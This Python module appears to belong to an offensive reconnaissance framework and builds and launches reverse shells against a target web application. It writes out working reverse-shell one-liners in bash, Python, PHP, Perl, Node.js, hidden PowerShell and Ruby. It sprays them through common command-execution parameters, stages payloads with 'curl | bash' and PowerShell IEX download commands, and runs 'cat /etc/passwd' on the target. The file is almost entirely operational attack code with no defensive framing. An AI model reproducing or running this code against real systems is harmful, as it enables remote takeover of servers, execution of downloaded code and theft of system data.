"""
modules/reverse_shell.py - Reverse shell generation and execution
Generate, deploy, and execute reverse shells
"""

import json
import logging
import os
import base64
from typing import Dict, List, Any, Optional, Callable

from core.http_engine import HTTPClient
from core.executor import run_command

logger = logging.getLogger("recon.reverse_shell")


class ReverseShellGenerator:
    """Reverse shell generation and execution engine"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/reverse_shell_findings.json"
    
    def generate_and_execute(
        self,
        url: str,
        shell_url: Optional[str] = None,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """
        Generate and execute reverse shells
        
        Args:
            url: Target URL with RCE vulnerability
            shell_url: Shell upload URL (for staged shells)
            lhost: Listener host
            lport: Listener port
            progress_cb: Progress callback
            
        Returns:
            Dict with shell results
        """
        result = {
            'url': url,
            'tool': 'reverse_shell',
            'type': 'reverse_shell_execution',
            'shells_generated': [],
            'shells_executed': [],
            'command_results': []
        }
        
        if progress_cb:
            progress_cb('reverse_shell', 'reverse_shell', 'Generating reverse shells...')
        
        logger.info(f"[SHELL] Generating reverse shells for {url}")
        
        # Generate shellcode for various languages
        shells = self._generate_shells(lhost, lport)
        result['shells_generated'] = shells
        
        # Try to execute shells
        for shell_lang, shell_payload in shells.items():
            if progress_cb:
                progress_cb('reverse_shell', 'reverse_shell', f'Attempting {shell_lang}...')
            
            logger.info(f"[SHELL] Attempting {shell_lang} reverse shell")
            
            # Try direct execution
            exec_result = self._execute_shell(url, shell_payload, shell_lang)
            if exec_result:
                result['shells_executed'].append(exec_result)
                logger.info(f"[SHELL] {shell_lang} shell executed successfully")
            
            # Try staged shell if URL provided
            if shell_url:
                staged_result = self._execute_staged_shell(url, shell_url, shell_lang, lhost, lport)
                if staged_result:
                    result['shells_executed'].append(staged_result)
        
        # Try command execution
        test_commands = [
            'id',
            'whoami',
            'pwd',
            'uname -a',
            'cat /etc/passwd'
        ]
        
        for cmd in test_commands:
            if progress_cb:
                progress_cb('reverse_shell', 'reverse_shell', f'Executing: {cmd}')
            
            cmd_result = self._execute_command(url, cmd)
            if cmd_result:
                result['command_results'].append(cmd_result)
                logger.info(f"[SHELL] Command executed: {cmd}")
        
        # Save findings
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[SHELL] Error saving findings: {e}")
        
        if progress_cb:
            success_count = len(result['shells_executed'])
            progress_cb('reverse_shell', 'reverse_shell', f'Completed: {success_count} shells executed')
        
        return result
    
    def _generate_shells(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate reverse shells for various interpreters"""
        shells = {}
        
        # Bash
        bash_shell = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        shells['bash'] = bash_shell
        
        # Python
        python_shell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
        shells['python'] = python_shell
        
        # PHP
        php_shell = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        shells['php'] = php_shell
        
        # Perl
        perl_shell = f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};'"""
        shells['perl'] = perl_shell
        
        # Node.js
        node_shell = f"""require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')"""
        shells['node'] = node_shell
        
        # PowerShell (Windows)
        ps_shell = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        shells['powershell'] = ps_shell
        
        # Ruby
        ruby_shell = f"""ruby -rsocket -e 'c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        shells['ruby'] = ruby_shell
        
        return shells
    
    def _execute_shell(self, url: str, shell_payload: str, shell_lang: str) -> Optional[Dict]:
        """Execute shell directly on target"""
        try:
            # URL encode the shell payload
            encoded = shell_payload.replace(' ', '%20').replace('"', '%22').replace("'", "%27")
            
            # Try common RCE parameters
            rce_params = ['cmd', 'command', 'exec', 'execute', 'code', 'shell']
            
            for param in rce_params:
                test_url = f"{url}?{param}={encoded}"
                try:
                    resp = self.http_client.get(test_url, timeout=5)
                    if resp.status_code == 200:
                        return {
                            'language': shell_lang,
                            'type': 'direct_execution',
                            'url': test_url,
                            'status': 'executed',
                            'response_size': len(resp.text)
                        }
                except:
                    pass
            
            # Try POST method
            payload_data = {
                'cmd': shell_payload,
                'command': shell_payload,
                'shell': base64.b64encode(shell_payload.encode()).decode()
            }
            
            try:
                resp = self.http_client.post(url, data=payload_data, timeout=5)
                if resp.status_code in [200, 201]:
                    return {
                        'language': shell_lang,
                        'type': 'post_execution',
                        'url': url,
                        'status': 'executed',
                        'response_size': len(resp.text)
                    }
            except Exception as e:
                logger.debug(f"[SHELL] POST execution failed: {e}")
        
        except Exception as e:
            logger.error(f"[SHELL] Error executing shell: {e}")
        
        return None
    
    def _execute_staged_shell(
        self,
        url: str,
        shell_url: str,
        shell_lang: str,
        lhost: str,
        lport: int
    ) -> Optional[Dict]:
        """Execute staged shell (download and execute)"""
        try:
            # Create download command based on language
            if shell_lang == 'bash':
                cmd = f"curl {shell_url} | bash"
            elif shell_lang == 'python':
                cmd = f"python -c 'import urllib2; exec(urllib2.urlopen(\"{shell_url}\").read())'"
            elif shell_lang == 'powershell':
                cmd = f"IEX(New-Object Net.WebClient).DownloadString('{shell_url}')"
            else:
                return None
            
            # Execute via RCE
            result = self._execute_shell(url, cmd, shell_lang)
            if result:
                result['type'] = 'staged_execution'
                result['stage_url'] = shell_url
                return result
        
        except Exception as e:
            logger.error(f"[SHELL] Error executing staged shell: {e}")
        
        return None
    
    def _execute_command(self, url: str, command: str) -> Optional[Dict]:
        """Execute arbitrary command on target"""
        try:
            # Try common RCE parameters
            rce_params = ['cmd', 'command', 'exec', 'shell']
            
            for param in rce_params:
                test_url = f"{url}?{param}={command.replace(' ', '%20')}"
                try:
                    resp = self.http_client.get(test_url, timeout=5)
                    if resp.status_code == 200 and len(resp.text) > 0:
                        return {
                            'command': command,
                            'parameter': param,
                            'url': test_url,
                            'status': 'executed',
                            'output': resp.text[:200]
                        }
                except:
                    pass
            
            # Try POST
            for param in rce_params:
                try:
                    resp = self.http_client.post(url, data={param: command}, timeout=5)
                    if resp.status_code in [200, 201] and len(resp.text) > 0:
                        return {
                            'command': command,
                            'parameter': param,
                            'method': 'POST',
                            'status': 'executed',
                            'output': resp.text[:200]
                        }
                except:
                    pass
        
        except Exception as e:
            logger.error(f"[SHELL] Error executing command: {e}")
        
        return None
